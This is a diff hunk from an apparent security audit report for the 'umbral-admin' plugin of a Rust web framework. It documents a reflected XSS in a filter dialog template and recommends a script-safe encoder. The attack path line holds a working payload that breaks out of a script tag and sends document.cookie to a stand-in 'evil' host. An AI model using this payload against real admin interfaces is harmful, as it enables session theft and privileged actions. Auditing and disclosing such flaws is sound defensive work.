@@ -35,7 +35,7 @@ Scope: `umbral-rest`, `umbral-admin`, `umbral-playground`, `umbral-openapi`, `um
 - **File:** `plugins/umbral-admin/templates/_macros/filter_dialog.html:218`, fed by `plugins/umbral-admin/src/handlers/list.rs:857-875`; values parsed in `plugins/umbral-admin/src/pagination.rs:89-110`; filter registered in `plugins/umbral-admin/src/engine.rs:42-45`
 - **Evidence:** `m[{{ key | tojson }}] = {{ val | tojson }};` inside `<script>`. The admin's `tojson` does `serde_json::to_string(...)` and `Value::from_safe_string`, bypassing autoescape. `serde_json` doesn't escape `/` or `<`, so a value containing `</script>` is emitted verbatim. `active_filters` keys/values come from attacker-controllable `filter_<field>=<value>` query params with no value allow-list.
 - **Attack path:** `GET /admin/<table>/filter-dialog?filter_x=</script><script>fetch('//evil/'+document.cookie)</script>`. A staff user opening a crafted admin link runs attacker JS in the admin origin (session theft, CSRF-token exfiltration, privileged actions).
-- **Fix:** Use a script-context-safe encoder that escapes `<`, `>`, `&`, `/` (at least `</` → `<\/` and `<!--`), as Django's `json_script` does; or emit data in `<script type="application/json">` read via `JSON.parse(textContent)` instead of interpolating into executable JS.
+- **Fix:** Use a script-context-safe encoder that escapes `<`, `>`, `&`, `/` (at least `</` → `<\/` and `<!--`), as a safe `json_script`-style helper does; or emit data in `<script type="application/json">` read via `JSON.parse(textContent)` instead of interpolating into executable JS.
 
 ## WEB-4 — Stored XSS via user-uploaded HTML/SVG served inline (umbral-media)
 > **✅ FIXED** (`a9f931d`) — active-content uploads neutralised to inert `.txt` at store time.
